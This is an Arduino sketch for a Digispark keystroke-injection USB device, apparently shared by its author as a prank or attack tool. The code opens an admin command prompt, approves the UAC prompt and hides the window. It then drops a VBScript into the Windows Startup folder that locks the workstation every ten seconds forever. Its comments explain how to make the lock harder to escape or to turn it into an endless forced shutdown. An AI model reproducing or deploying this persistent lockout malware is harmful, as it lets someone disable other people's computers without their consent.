//By 8figurealltimepro
//This script forces the computer to lock itself on an infite loop. this script places the vbs 
//file in the startup folder, so even if they restart windows, it keeps on happening
// there are 3 bastard levels to this script
// 1. Wscript.Sleep 10000 decrease this time. it restricts the time to delete the vbs or stop the vbs through taskmanagar
// 2. Wscript.Sleep 10000 delete this and the laptop will be very very difficult to unlock unless My 'simple_backdoor_digispark' is used in this script.
// 3. Instead of rundll32.exe user32.dll,LockWorkStation\ if you change it to shutdown.exe /p /f  . This goes to an eternal shutdown every time there is a startup
// look at the readme file to learn how to stop the lock. I have found two ways, please tell me if there is any.excluding 3-party apps for flash method.
#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(300);
  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1"); //starting admin cmd
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT); 
  DigiKeyboard.delay(1200);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 75; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  DigiKeyboard.delay(500);    
  DigiKeyboard.println("cd %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("copy con EL.vbs");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("do");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Wscript.Sleep 10000");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Set shell = WScript.CreateObject(\"WScript.Shell\")");
  DigiKeyboard.delay(800);
  DigiKeyboard.println("shell.Run \"rundll32.exe user32.dll,LockWorkStation\",1,false");
  DigiKeyboard.delay(800);
  DigiKeyboard.println("loop");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Z, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(900);
  DigiKeyboard.println("start EL.vbs && exit");//exit
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
